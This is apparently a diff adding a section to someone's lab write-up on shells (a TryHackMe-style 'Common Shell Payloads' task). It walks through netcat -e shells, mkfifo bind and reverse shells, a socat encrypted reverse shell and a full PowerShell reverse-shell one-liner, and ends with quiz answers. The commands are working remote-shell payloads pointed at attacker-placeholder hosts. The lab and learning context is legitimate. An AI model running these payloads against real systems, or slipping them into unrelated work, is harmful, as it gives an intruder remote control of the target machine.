@@ -424,3 +424,58 @@ If your IP is 10.10.10.5, what syntax would you use to connect back to this list
 
 **Answer:** socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
+## Task 8 Common Shell Payloads
+Before diving into creating payloads with msfvenom, I took some time to explore a few commonly used payloads using the tools we've already covered — mainly netcat.
+
+In one of the earlier tasks, there was mention of setting up netcat to act as a listener for a bind shell, so I decided to try that out first. Some versions of netcat, like the nc.exe for Windows (which is available in Kali under /usr/share/windows-resources/binaries) and the netcat-traditional version used in Kali Linux, support the -e flag. This flag allows you to execute a command once a connection is made. For example:
+```bash
+nc -lvnp <PORT> -e /bin/bash
+```
+
+Connecting to this listener from another machine using netcat would give a bind shell on the target.
+
+Similarly, you can get a reverse shell by using:
+```bash
+nc <LOCAL-IP> <PORT> -e /bin/bash
+```
+
+However, it's worth noting that most netcat versions don’t include the -e option, as it’s considered a serious security risk. On Windows, where we often use a static binary anyway, this method works just fine. On Linux, though, an alternative approach is necessary. Here’s a useful one-liner I found that creates a bind shell using standard netcat:
+```bash
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+To quickly break it down: this command sets up a named pipe at /tmp/f, and then ties the netcat listener's input/output to a shell via that pipe. The idea is to route everything typed into the netcat session through the pipe, into sh, and then back again, creating a functional shell.
+
+![image](https://github.com/user-attachments/assets/323cff8b-03ea-4036-8916-8c2eb1b22e1d)
+
+I also found that a very similar one-liner can be used to create a netcat reverse shell:
+```bash
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+This is nearly identical to the bind shell version I mentioned earlier — the only real difference is that this time, netcat is initiating a connection to the attacker's machine (reverse shell), rather than listening for one. It's a neat little trick for getting around the lack of the -e flag in most netcat builds.
+
+![image](https://github.com/user-attachments/assets/1baa33bb-af0d-4691-bec5-ed788c4073b5)
+
+When working with modern Windows Server targets, I often find that a PowerShell reverse shell is required. It's a pretty common approach, so I made sure to keep the go-to one-liner handy.
+
+The command itself looks messy and complex — and to keep things simple, I won’t go into breaking it down here, but it’s incredibly effective:
+
+```bash
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+All I had to do was swap in my attacker IP and chosen port in place of <ip> and <port>. After that, I could simply drop it into a cmd.exe shell (or even a webshell) and execute it — and just like that, I’d have a reverse shell back to my machine.
+
+![image](https://github.com/user-attachments/assets/50bda3a6-8773-4219-b21c-cc262c5e715b)
+
+For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what's available.
+
+### Question 1:
+What command can be used to create a named pipe in Linux?
+
+**Answer:** mkfifo 
+
+### Question 2: Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise yourself with the languages available.
+
+**Answer:** No answer needed
